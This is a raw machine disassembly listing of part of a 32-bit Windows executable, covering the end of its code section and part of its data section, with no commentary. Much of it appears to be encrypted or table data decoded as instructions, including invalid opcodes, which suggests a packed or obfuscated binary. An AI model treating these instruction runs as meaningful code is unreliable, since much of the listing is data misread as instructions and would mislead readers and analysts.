  412b1a:	adc    BYTE PTR [edx+0x6e1d6958],dh
  412b20:	sbb    al,0xe6
  412b22:	jge    0x53fbcc4a
  412b28:	aaa    
  412b29:	push   ebp
  412b2a:	pop    ds
  412b2b:	ret    
  412b2c:	pop    ds
  412b2d:	sub    edi,DWORD PTR [ebp-0x3068a3ac]
  412b33:	push   cs
  412b34:	mov    DWORD PTR [esi],0x7b5e3cf5
  412b3a:	lahf   
  412b3b:	add    BYTE PTR [eax],cl
  412b3d:	jno    0x412ba8
  412b3f:	gs not dl
  412b42:	sbb    dh,BYTE PTR [ebp-0x27]
  412b45:	cmc    
  412b46:	push   ds
  412b47:	imul   ecx,DWORD PTR [esi-0x7bdc98f8],0x31
  412b4e:	add    eax,0x92d790b8
  412b53:	(bad)  
  412b54:	add    ebx,ebp
  412b56:	xor    DWORD PTR [edx+0x11],esi
  412b59:	and    BYTE PTR [edi],dl
  412b5b:	xchg   edx,eax
  412b5c:	add    BYTE PTR [edi],bl
  412b5e:	repz fbstp TBYTE PTR [ebx+0x71]
  412b62:	xlat   BYTE PTR ds:[ebx]
  412b63:	(bad)  
  412b64:	sub    al,0x5f
  412b66:	mov    bh,0x68
  412b68:	(bad)  
  412b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b6a:	xchg   DWORD PTR [edi],edx
  412b6c:	cmp    DWORD PTR [edx],ebp
  412b6e:	scas   al,BYTE PTR es:[edi]
  412b6f:	out    dx,al
  412b70:	dec    esi
  412b71:	inc    ebx
  412b72:	xor    bh,ch
  412b74:	ficom  DWORD PTR [eax-0x1cb0010d]
  412b7a:	jp     0x412be1
  412b7c:	nop
  412b7d:	jbe    0x412bbd
  412b7f:	out    0x47,al
  412b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b82:	adc    BYTE PTR [ecx],0x7e
  412b85:	and    esp,eax
  412b87:	sti    
  412b88:	mov    bl,0x73
  412b8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b8b:	pop    ss
  412b8c:	mov    bh,0x1
  412b8e:	inc    ebx
  412b8f:	cmc    
  412b90:	daa    
  412b91:	retf   0x6660
  412b94:	aas    
  412b95:	(bad)  
  412b96:	and    eax,0x5c445ce9
  412b9b:	int3   
  412b9c:	nop
  412b9d:	push   ebx
  412b9e:	lods   eax,DWORD PTR ds:[esi]
  412b9f:	or     BYTE PTR [ebp+eiz*2-0x12addae3],al
  412ba6:	(bad)  
  412ba7:	mov    al,0x4
  412ba9:	ret    0xc214
  412bac:	ja     0x412bfe
  412bae:	jno    0x412b4b
  412bb0:	out    dx,eax
  412bb1:	jbe    0x412b54
  412bb3:	rcl    BYTE PTR [eax-0x47909171],0x69
  412bba:	dec    esp
  412bbb:	aad    0x9c
  412bbd:	cmp    DWORD PTR [edi],0x132161f8
  412bc3:	and    bh,BYTE PTR [eax]
  412bc5:	pop    eax
  412bc6:	mov    ebp,0xb8c5c541
  412bcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bcc:	iret   
  412bcd:	mov    ebp,0xaf454da8
  412bd2:	xchg   ebp,eax
  412bd3:	dec    edx
  412bd4:	and    ebp,DWORD PTR [esp+ebp*1]
  412bd7:	inc    esp
  412bd8:	aam    0x9d
  412bda:	cmp    al,0xc5
  412bdc:	out    0x6a,eax
  412bde:	add    al,0x5b
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0x43000000
  413429:	dec    eax
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	inc    ebx
  41342d:	cmp    al,BYTE PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
  41353a:	add    DWORD PTR [eax],eax
  41353c:	xchg   BYTE PTR [ecx],bh
  41353e:	add    DWORD PTR [eax],eax
  413540:	xchg   esp,eax
  413541:	cmp    DWORD PTR [ecx],eax
  413543:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41354a:	add    DWORD PTR [eax],eax
  41354c:	mov    ah,0x39
  41354e:	add    DWORD PTR [eax],eax
  413550:	les    edi,FWORD PTR [ecx]
  413552:	add    DWORD PTR [eax],eax
  413554:	into   
  413555:	cmp    DWORD PTR [ecx],eax
  413557:	add    dh,dl
  413559:	cmp    DWORD PTR [ecx],eax
  41355b:	add    dl,ah
  41355d:	cmp    DWORD PTR [ecx],eax
  41355f:	add    dl,ch
  413561:	cmp    DWORD PTR [ecx],eax
  413563:	add    ah,dh
  413565:	cmp    DWORD PTR [ecx],eax
  413567:	add    ah,bh
  413569:	cmp    DWORD PTR [ecx],eax
  41356b:	add    BYTE PTR [eax],cl
  41356d:	cmp    al,BYTE PTR [ecx]
  41356f:	add    BYTE PTR [edx],dl
  413571:	cmp    al,BYTE PTR [ecx]
  413573:	add    BYTE PTR [edx],bl
  413575:	cmp    al,BYTE PTR [ecx]
  413577:	add    BYTE PTR [edx+edi*1],ah
  41357a:	add    DWORD PTR [eax],eax
  41357c:	xor    BYTE PTR [edx],bh
  41357e:	add    DWORD PTR [eax],eax
  413580:	cmp    bh,BYTE PTR [edx]
  413582:	add    DWORD PTR [eax],eax
  413584:	dec    eax
  413585:	cmp    al,BYTE PTR [ecx]
  413587:	add    BYTE PTR [edx+0x3a],dl
  41358a:	add    DWORD PTR [eax],eax
  41358c:	pop    esi
  41358d:	cmp    al,BYTE PTR [ecx]
